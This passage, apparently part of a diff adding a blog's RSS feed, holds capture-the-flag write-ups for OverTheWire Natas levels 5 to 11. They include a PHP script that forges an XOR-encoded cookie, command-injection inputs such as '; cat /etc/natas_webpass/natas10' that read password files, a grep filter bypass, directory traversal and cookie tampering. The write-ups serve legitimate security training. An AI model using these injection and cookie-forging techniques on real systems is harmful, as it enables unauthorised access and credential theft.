+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;for($i&amp;amp;nbsp;=&amp;amp;nbsp;0;&amp;amp;nbsp;$i&amp;amp;nbsp;&amp;amp;lt;&amp;amp;nbsp;strlen($in);&amp;amp;nbsp;$i++)&amp;amp;nbsp;{
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;$outText&amp;amp;nbsp;.=&amp;amp;nbsp;$in[$i]&amp;amp;nbsp;^&amp;amp;nbsp;$key[$i&amp;amp;nbsp;%&amp;amp;nbsp;strlen($key)];
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;}
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;return&amp;amp;nbsp;$outText;
+}
+
+$cookie&amp;amp;nbsp;=&amp;amp;nbsp;array(&amp;quot;showpassword&amp;quot;=&amp;amp;gt;&amp;quot;yes&amp;quot;,&amp;amp;nbsp;&amp;quot;bgcolor&amp;quot;=&amp;amp;gt;&amp;quot;#ffffff&amp;quot;);
+$key&amp;amp;nbsp;=&amp;amp;nbsp;&amp;quot;qw8J&amp;quot;;
+
+print&amp;amp;nbsp;&amp;quot;New&amp;amp;nbsp;Cookie&amp;amp;nbsp;Value:&amp;amp;nbsp;&amp;quot;&amp;amp;nbsp;.&amp;amp;nbsp;base64_encode(custom_xor($key,&amp;amp;nbsp;json_encode($cookie)))&amp;amp;nbsp;.&amp;amp;nbsp;&amp;quot;\n&amp;quot;;
+
+?&amp;amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;When ran, it produced the following.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mandreko$ php natas11_encode.php 
+New Cookie Value: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I then pasted that cookie value into my Edit This Cookie extension, and refreshed the page.  It then presented me with the password to the next level.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas11_3.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+</description>
+    </item>
+    
+    <item>
+      <title>OverTheWire Natas Level 10</title>
+      <link>https://www.mattandreko.com/blog/2012-11-09-overthewire-natas-level-10/</link>
+      <pubDate>Fri, 09 Nov 2012 07:28:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-11-09-overthewire-natas-level-10/</guid>
+      <description>&lt;p&gt;On to &lt;a href=&#34;http://www.overthewire.org/wargames/natas/natas10.shtml&#34;&gt;Level 10&lt;/a&gt; of the &lt;a href=&#34;http://www.overthewire.org&#34;&gt;OverTheWire&lt;/a&gt; Natas wargame! This level is extremely similar to level 9, except that now they are implementing a basic filtering, to prevent you from entering certain characters that could cause changes in the execution of the program. However, their filter is flawed.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;It starts out just like the last level, with a search dialog.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas10_1.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Again, as always, I review the code since it&amp;rsquo;s available. You can see that it&amp;rsquo;s using a &amp;ldquo;preg_match&amp;rdquo; to try to filter out bad characters. This however is flawed still. Instead of a blacklist, it should be a whitelist of only certain values.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas10_2.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Because I can&amp;rsquo;t complete the command using a semicolon or ampersand, and start a new one, I instead go with the approach of having &amp;ldquo;grep&amp;rdquo; just return me the password file as well as the dictionary. I enter, &amp;lsquo;&amp;ldquo;$&amp;rdquo; /etc/natas_webpass/natas11&amp;rsquo;, and it is fairly successful. The &amp;ldquo;$&amp;rdquo; tells grep to search for any line that contains a &amp;ldquo;end of line&amp;rdquo;. Since pretty much every line will have that, it outputs the entire file. I then include the password file as well as the dictionary, so it reads me both back. This then provides the password to the next level.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas10_3.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+</description>
+    </item>
+    
+    <item>
+      <title>OverTheWire Natas Level 9</title>
+      <link>https://www.mattandreko.com/blog/2012-11-08-overthewire-natas-level-9/</link>
+      <pubDate>Thu, 08 Nov 2012 06:12:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-11-08-overthewire-natas-level-9/</guid>
+      <description>&lt;p&gt;The next level of &lt;a href=&#34;http://www.overthewire.org&#34;&gt;OverTheWire&amp;rsquo;s&lt;/a&gt; Nata challenge is &lt;a href=&#34;http://www.overthewire.org/wargames/natas/natas9.shtml&#34;&gt;Level 9&lt;/a&gt;. This is a command injection vulnerability.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;Initially, you are given a search box.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas9_1.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Just like in previous levels, I looked at the available source code. You can see the vulnerability is that the user input is not sanitized. Due to this, you can inject code into the &amp;ldquo;grep&amp;rdquo; command it is running to do the search.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas9_2.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I simply put in the search box, &amp;ldquo;; cat /etc/natas_webpass/natas10&amp;rdquo;, since that is where the password file is located. The command it ends up running is &amp;ldquo;grep -i; cat /etc/natas_webpass/natas10dictionary.txt&amp;rdquo;. The semi-colon terminates the &amp;ldquo;grep&amp;rdquo; command, and allows the &amp;ldquo;cat&amp;rdquo; to then run next. I end up passing in the password file, as well as the dictionary. In some cases, you may need to end the line with a comment, to keep it from executing, by putting in a &amp;ldquo;#&amp;rdquo;. Regardless, after running, you get the password to the next level.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas9_3.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+</description>
+    </item>
+    
+    <item>
+      <title>OverTheWire Natas Level 8</title>
+      <link>https://www.mattandreko.com/blog/2012-11-07-overthewire-natas-level-8/</link>
+      <pubDate>Wed, 07 Nov 2012 05:56:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-11-07-overthewire-natas-level-8/</guid>
+      <description>&lt;p&gt;&lt;a href=&#34;http://www.overthewire.org/wargames/natas/natas8.shtml&#34;&gt;Level 8&lt;/a&gt; of the &lt;a href=&#34;http://www.overthewire.org&#34;&gt;OverTheWires&lt;/a&gt; Natas wargame was pretty simple, as a developer, but could prove more difficult if you don&amp;rsquo;t have similar background.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;It starts out with a secret password input.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas8_1.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Like other levels, I looked at the source code to see what was going on in the background.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas8_2.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Based on this code, you can see that it has a stored secret value, that is base64 encoded, then reversed, and then converted to a hex string. That value is then compared to the stored secret value, and if it&amp;rsquo;s a match, it will give you the next level&amp;rsquo;s password.&lt;/p&gt;
+
+&lt;p&gt;I decided to write a reversal program in php, since it was super easy. The only problem it gave me, was that there is no built-in hex2bin method until a newer version of PHP than I had on my machine. Luckily, on the &lt;a href=&#34;http://www.php.net/manual/en/function.bin2hex.php&#34;&gt;bin2hex&lt;/a&gt; documentation page, someone kindly wrote a reversal function that I stole.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas8_3.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Once I executed that program in php, it gave me the decoded password. Once I entered it into the page, it gave me the password to the next level.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas8_4.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+</description>
+    </item>
+    
+    <item>
+      <title>OverTheWire Natas Level 7</title>
+      <link>https://www.mattandreko.com/blog/2012-11-06-overthewire-natas-level-7/</link>
+      <pubDate>Tue, 06 Nov 2012 05:32:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-11-06-overthewire-natas-level-7/</guid>
+      <description>&lt;p&gt;Finally, with level 7 of OverTheWire&amp;rsquo;s Natas wargame, we start to get to more &amp;ldquo;real world&amp;rdquo; vulnerabilities. It&amp;rsquo;s still very easy, but it&amp;rsquo;s at least getting better.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;We start with a single page, that has 2 navigation links.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas7_1.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I noted that the URLs had a &amp;ldquo;page=&amp;rdquo; parameter. I thought maybe this would be the file it was including. Viewing the source gave a nice reminder of where the password for the next level would be stored.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas7_2.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I then tried a directory traversal exploit, pointing to the password file for the next level. It successfully displayed the password.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas7_3.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+</description>
+    </item>
+    
+    <item>
+      <title>OverTheWire Natas Level 6</title>
+      <link>https://www.mattandreko.com/blog/2012-11-05-overthewire-natas-level-6/</link>
+      <pubDate>Mon, 05 Nov 2012 05:12:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-11-05-overthewire-natas-level-6/</guid>
+      <description>&lt;p&gt;The &lt;a href=&#34;http://www.overthewire.org/wargames/natas/natas6.shtml&#34;&gt;6th level&lt;/a&gt; of the &lt;a href=&#34;http://www.overthewire.org&#34;&gt;OverTheWire&lt;/a&gt; Natas wargame starts introducing us to PHP and server configuration issues.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;It starts out with a secret password prompt.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas6_1.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I took a look at the sourcecode, via the link provided.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas6_2.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I decided I would try and see if I could request the &amp;ldquo;secret.inc&amp;rdquo; file, and it worked perfectly.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas6_3.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;After I put in the secret value into the input box, it showed me the password for the next level.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas6_4.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;This level teaches that files that contain secrets should never be publicly accessible. Either put them in server-side code so that they&amp;rsquo;re not rendered, or put them out of the webroot.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>OverTheWire Natas Level 5</title>
+      <link>https://www.mattandreko.com/blog/2012-11-04-overthewire-natas-level-5/</link>
+      <pubDate>Sun, 04 Nov 2012 18:34:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-11-04-overthewire-natas-level-5/</guid>
+      <description>&lt;p&gt;Now that we&amp;rsquo;re about &lt;sup&gt;1&lt;/sup&gt;&amp;frasl;&lt;sub&gt;3&lt;/sub&gt; through to the end of the &lt;a href=&#34;http://www.overthewire.org&#34;&gt;OverTheWire&lt;/a&gt; Natas wargame, I&amp;rsquo;m hoping that they start to get a little more tricky. &lt;a href=&#34;http://www.overthewire.org/wargames/natas/natas5.shtml&#34;&gt;Level 5&lt;/a&gt; unfortunately is still pretty easy.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;It starts by simply telling you that you&amp;rsquo;re not logged in.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas5_1.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Logins often hand out cookies, so I viewed my cookies for the site. I then used the wonderful Chrome extension, &lt;a href=&#34;https://chrome.google.com/webstore/detail/edit-this-cookie/fngmhnnpilhplaeedifhccceomclgfbg&#34;&gt;Edit This Cookie&lt;/a&gt;, to modify the cookie that I saw it assign, from a &amp;ldquo;0&amp;rdquo; to a &amp;ldquo;1&amp;rdquo;, signifying that I was logged on.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas5_2.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;After saving the changes to the cookie, I refreshed the page, and it showed me the next level&amp;rsquo;s password.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas5_3.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+</description>
+    </item>
+    
+  </channel>
+</rss>
